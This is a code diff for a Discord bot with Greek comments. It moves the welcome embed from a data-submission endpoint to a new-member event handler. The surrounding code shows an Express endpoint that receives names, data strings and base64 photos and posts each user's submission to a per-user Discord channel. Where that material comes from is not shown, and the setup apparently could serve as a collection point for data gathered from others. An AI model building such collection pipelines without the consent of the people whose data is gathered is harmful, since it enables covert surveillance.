@@ -15,7 +15,7 @@ const client = new Client({
         GatewayIntentBits.Guilds,
         GatewayIntentBits.GuildMessages,
         GatewayIntentBits.MessageContent,
-        GatewayIntentBits.GuildMembers
+        GatewayIntentBits.GuildMembers // ΑΠΑΡΑΙΤΗΤΟ για να βλέπεις νέα μέλη
     ]
 });
 
@@ -52,30 +52,55 @@ client.once('ready', () => {
     }
 });
 
+// ---------- WELCOME SYSTEM (ΑΥΤΟΜΑΤΟ) ----------
+client.on('guildMemberAdd', async (member) => {
+    console.log(`👤 Νέο μέλος στον server: ${member.user.tag} (${member.id})`);
+    
+    try {
+        const guild = client.guilds.cache.get(SERVER_ID);
+        if (!guild) {
+            console.error('❌ Δεν βρέθηκε ο server');
+            return;
+        }
+
+        const welcomeChannel = guild.channels.cache.get(WELCOME_CHANNEL_ID);
+        if (!welcomeChannel) {
+            console.error(`❌ Δεν βρέθηκε το welcome κανάλι με ID: ${WELCOME_CHANNEL_ID}`);
+            return;
+        }
+
+        // Δημιουργία embed
+        const embed = new EmbedBuilder()
+            .setColor(0x00ff88)
+            .setTitle('👋 ΚΑΛΩΣ ΗΡΘΕΣ!')
+            .setDescription(`Καλώς ήρθες στον server μας, **${member.user.username}**! 🎉`)
+            .addFields(
+                { name: '👤 Χρήστης', value: `${member.user.tag}`, inline: true },
+                { name: '📅 Δημιουργία Λογαριασμού', value: `<t:${Math.floor(member.user.createdTimestamp / 1000)}:R>`, inline: true },
+                { name: '📊 Σειρά Εγγραφής', value: `#${guild.memberCount}`, inline: true }
+            )
+            .setThumbnail(member.user.displayAvatarURL({ dynamic: true, size: 256 }))
+            .setTimestamp()
+            .setFooter({ 
+                text: 'Secure Connection System • Auto-Welcome',
+                iconURL: 'https://cdn.discordapp.com/emojis/1085933512993218630.png'
+            });
+
+        // Αποστολή στο welcome κανάλι
+        await welcomeChannel.send({ embeds: [embed] });
+        console.log(`👋 Στάλθηκε welcome για τον ${member.user.tag} στο #${welcomeChannel.name}`);
+
+    } catch (error) {
+        console.error('❌ Σφάλμα κατά την αποστολή welcome:', error);
+    }
+});
+
 // ---------- ΒΟΗΘΗΤΙΚΕΣ ΣΥΝΑΡΤΗΣΕΙΣ ----------
 function cleanName(name) {
     return name.toLowerCase()
         .replace(/\s+/g, '-')
         .replace(/[^a-z0-9-]/g, '')
         .substring(0, 30);
-}
-
-function createWelcomeEmbed(userName, channelName) {
-    return new EmbedBuilder()
-        .setColor(0x00ff88)
-        .setTitle('👋 ΝΕΟΣ ΧΡΗΣΤΗΣ!')
-        .setDescription(`**${userName}** μόλις συνδέθηκε στο σύστημα!`)
-        .addFields(
-            { name: '📁 Κανάλι Χρήστη', value: `<#${channelName}>`, inline: true },
-            { name: '🕐 Χρόνος Σύνδεσης', value: new Date().toLocaleString('el-GR'), inline: true },
-            { name: '🔒 Κατάσταση', value: '✅ Επαληθεύτηκε', inline: true }
-        )
-        .setTimestamp()
-        .setFooter({ 
-            text: 'Secure Connection System • New User',
-            iconURL: 'https://cdn.discordapp.com/emojis/1085933512993218630.png'
-        })
-        .setThumbnail('https://cdn.discordapp.com/emojis/1085933512993218630.png');
 }
 
 function createDataEmbed(dataString, userName, photoBase64) {
@@ -207,29 +232,6 @@ async function clearChannelMessages(channel) {
     }
 }
 
-async function sendWelcomeMessage(userName, channelId) {
-    try {
-        const guild = client.guilds.cache.get(SERVER_ID);
-        if (!guild) {
-            console.error('❌ Δεν βρέθηκε ο server');
-            return;
-        }
-
-        const welcomeChannel = guild.channels.cache.get(WELCOME_CHANNEL_ID);
-        if (!welcomeChannel) {
-            console.error(`❌ Δεν βρέθηκε το welcome κανάλι με ID: ${WELCOME_CHANNEL_ID}`);
-            return;
-        }
-
-        const embed = createWelcomeEmbed(userName, channelId);
-        await welcomeChannel.send({ embeds: [embed] });
-        console.log(`👋 Στάλθηκε welcome για τον ${userName} στο #${welcomeChannel.name}`);
-
-    } catch (error) {
-        console.error('❌ Σφάλμα κατά την αποστολή welcome:', error);
-    }
-}
-
 // ---------- ENDPOINTS ----------
 app.post('/', async (req, res) => {
     console.log('\n📥 ΝΕΟ ΑΙΤΗΜΑ!');
@@ -265,8 +267,6 @@ app.post('/', async (req, res) => {
             c.parentId === CATEGORY_ID
         );
         
-        let isNewChannel = false;
-        
         if (!channel) {
             console.log(`📝 Δημιουργία νέου καναλιού...`);
             channel = await guild.channels.create({
@@ -276,14 +276,8 @@ app.post('/', async (req, res) => {
                 reason: `Κανάλι για τον χρήστη ${name}`
             });
             console.log(`✅ Δημιουργήθηκε το κανάλι: ${channel.name}`);
-            isNewChannel = true;
         } else {
             console.log(`✅ Βρέθηκε υπάρχον κανάλι: ${channel.name}`);
-        }
-        
-        // ΣΤΟΛΗ WELCOME ΜΗΝΥΜΑΤΟΣ (μόνο αν είναι νέο κανάλι)
-        if (isNewChannel) {
-            await sendWelcomeMessage(name, channel.id);
         }
         
         const dataHash = Buffer.from(data + (photo || '')).toString('base64').substring(0, 50);
@@ -321,8 +315,7 @@ app.post('/', async (req, res) => {
         res.json({ 
             success: true, 
             channel: channel.name,
-            message: 'Data sent successfully',
-            isNewChannel: isNewChannel
+            message: 'Data sent successfully'
         });
         
     } catch (error) {
